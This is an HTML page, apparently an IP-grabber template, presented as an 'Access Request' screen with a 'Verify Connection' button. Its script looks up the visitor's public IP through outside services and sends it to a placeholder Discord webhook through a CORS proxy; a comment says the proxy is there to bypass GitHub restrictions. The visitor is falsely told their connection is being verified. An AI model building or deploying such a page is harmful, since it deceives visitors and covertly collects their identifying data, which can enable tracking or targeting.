<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Access Request</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: white;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
      animation: gradientBG 15s ease infinite;
      background-size: 400% 400%;
    }
    
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .container {
      padding: 2rem;
      background: rgba(0,0,0,0.3);
      border-radius: 15px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
      max-width: 500px;
      width: 90%;
    }
    
    button {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s;
      margin-top: 20px;
    }
    
    button:hover {
      background: #45a049;
      transform: translateY(-2px);
    }
    
    button:disabled {
      background: #cccccc;
      cursor: not-allowed;
    }
    
    #status {
      margin-top: 20px;
      min-height: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Request Access</h1>
    <p>Click below to verify your connection</p>
    <button id="requestBtn" onclick="requestAccess()">Verify Connection</button>
    <div id="status"></div>
  </div>

  <script>
    async function requestAccess() {
      const btn = document.getElementById('requestBtn');
      const status = document.getElementById('status');
      
      btn.disabled = true;
      status.textContent = "Processing request...";
      
      try {
        // Method 1: Try ipify first
        let ipAddress;
        try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          if (ipResponse.ok) {
            const data = await ipResponse.json();
            ipAddress = data.ip;
          }
        } catch (e) {}
        
        // Method 2: If ipify fails, try another service
        if (!ipAddress) {
          try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            if (ipResponse.ok) {
              const data = await ipResponse.json();
              ipAddress = data.ip;
            }
          } catch (e) {}
        }
        
        if (!ipAddress) {
          throw new Error("Could not detect your IP address");
        }
        
        status.textContent = "Completing verification...";
        
        // Using a CORS proxy to bypass GitHub restrictions
        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your actual webhook
        const proxyUrl = `https://cors-anywhere.herokuapp.com/${webhookUrl}`;
        
        const response = await fetch(proxyUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
          },
          body: JSON.stringify({
            content: `New access request from IP: ${ipAddress}`
          })
        });
        
        if (!response.ok) {
          throw new Error("Submission failed - please try again later");
        }
        
        status.textContent = "âœ“ Access request received!";
        btn.textContent = "Request Submitted";
      } catch (error) {
        console.error("Error:", error);
        status.textContent = "Error: " + error.message;
        btn.disabled = false;
        btn.textContent = "Try Again";
      }
    }
  </script>
</body>
</html>
